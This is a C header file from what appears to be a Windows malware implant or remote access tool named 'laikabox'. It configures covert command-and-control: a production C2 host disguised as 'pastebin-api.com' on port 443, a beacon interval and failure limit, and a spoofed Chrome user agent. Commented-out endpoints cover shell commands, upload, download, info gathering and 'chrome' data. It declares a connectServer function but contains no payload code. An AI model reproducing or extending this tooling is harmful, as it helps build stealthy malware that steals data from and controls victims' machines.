#pragma once

#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <urlmon.h>

#include "strings_main.h"
#include "laikabox.h"

#define URL_SIZE 256
#define SERVER_PORT 6983
#define BROADCAST_PORT 6983
#define BROADCAST_INTERVAL 2    // Broadcast every 2 seconds if no message received

// connection related
#ifdef PRODUCTION
// #define SERVER_ADDR             "pastebin-api.com"
#define SERVER_PORT_C2          443
#else
// #define SERVER_ADDR             "127.0.0.1"
#define SERVER_PORT_C2          5000
#endif

#define SERVER_RSC_PATH         "/postdata"
// #define PATH_BEACON             "/beacon/"
// #define PATH_INFOGATHER         "/infogather/"
// #define PATH_REGISTER           "/register/"
// #define PATH_SHELLCMD           "/shellcmd/"
// #define PATH_UPLOAD             "/upload/"
// #define PATH_DOWNLOAD           "/download/"
// #define PATH_CHROME             "/chrome/"


#define BEACON_INTERVAL         2986
#define MAX_BEACON_FAIL         10
// #define USERAGENT               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"

DWORD connectServer(const char* ip,
                    WORD port,
                    const char* resource,
                    LPBYTE bufferRequest,
                    DWORD requestBytes,
                    LPBYTE bufferReply,
                    DWORD bufferReplyMaxBytes,
                    DWORD *bufferReplyBytes);